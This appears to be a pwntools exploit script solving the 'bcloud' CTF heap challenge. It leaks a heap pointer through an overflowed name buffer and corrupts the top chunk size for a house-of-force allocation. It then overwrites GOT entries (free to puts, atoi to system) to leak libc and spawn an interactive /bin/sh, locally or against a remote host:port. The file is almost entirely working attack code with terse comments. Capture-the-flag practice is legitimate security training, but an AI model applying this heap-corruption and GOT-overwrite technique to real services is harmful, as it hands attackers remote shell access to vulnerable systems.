#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="info")
localfile = "./origin_bcloud"
locallibc = "/lib/i386-linux-gnu/libc.so.6"

pf = lambda name,num         :log.info(name + " 0x%x: " % num)

def menu(s):
    io.recvuntil("option--->>\n")
    io.sendline(s)

def newnote(s):
    menu(b"1")
    io.recvuntil("Input the length of the note content:\n")
    io.sendline(str(len(s)))
    io.recvuntil("Input the content:\n")
    io.send(s)

def editnote(idx, content):
    menu(b"3")
    io.recvuntil("Input the id:\n")
    io.sendline(str(idx))
    io.recvuntil("Input the new content:\n")
    io.send(content)
    
def delnote(idx):
    menu(b"4")
    io.recvuntil("Input the id:\n")
    io.sendline(str(idx))

def exp():
    one_gadget = 0x3ac5c
    atoi_got   = elf.got["atoi"]
    free_got   = elf.got["free"]
    puts_plt   = elf.plt["puts"]
    bss_addr   = 0x804B0A0              # start address of sizes array

    io.recvuntil("Input your name:\n")
    # gdb.attach(io, "b *0x8048829")
    io.send(b"A"*0x3C + b"BBBB")
    io.recvuntil(b"BBBB")
    leak_heap = u32(io.recv(4))                 # leak heap
    heap_top = leak_heap + 0x40 + 0x48*2
    evil_size = bss_addr - 4*4 - heap_top - 4

    pf("heap top", heap_top)
    pf("evil size", evil_size&0xffffffff)

    io.recvuntil("Org:\n")
    io.send(b"A"*0x40)
    io.recvuntil("Host:\n")
    # gdb.attach(io, """dir ~/glibc-2.23/malloc/
    # b *0x8048742
    # b _int_malloc
    # b *0x8048CFE""")
    io.sendline(p32(0xffffffff))                # overwrite topchunk->size
    
    # house of force
    menu(b"1")
    io.recvuntil("Input the length of the note content:\n")

    # io.sendline(str(evil_size&0xffffffff))
    io.sendline(str(evil_size))                    # get the unsigned size
    io.recvuntil("Input the content:\n")
    io.sendline("padding")

    payload  = p32(4)*2 + p32(0)*30
    payload += p32(atoi_got) + p32(free_got) + p32(atoi_got)
    newnote(payload)

    editnote(1, p32(puts_plt))
    # gdb.attach(io, """set verbose on
    # b *0x8048BDE
    # b *0x8048CFE""")
    
    delnote(2)
    atoi_addr = u32(io.recv(4))
    libc_base = atoi_addr - libc.sym["atoi"]
    system_addr = libc_base + libc.sym["system"]
    editnote(0, p32(system_addr))

    menu(b"/bin/sh")

    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()
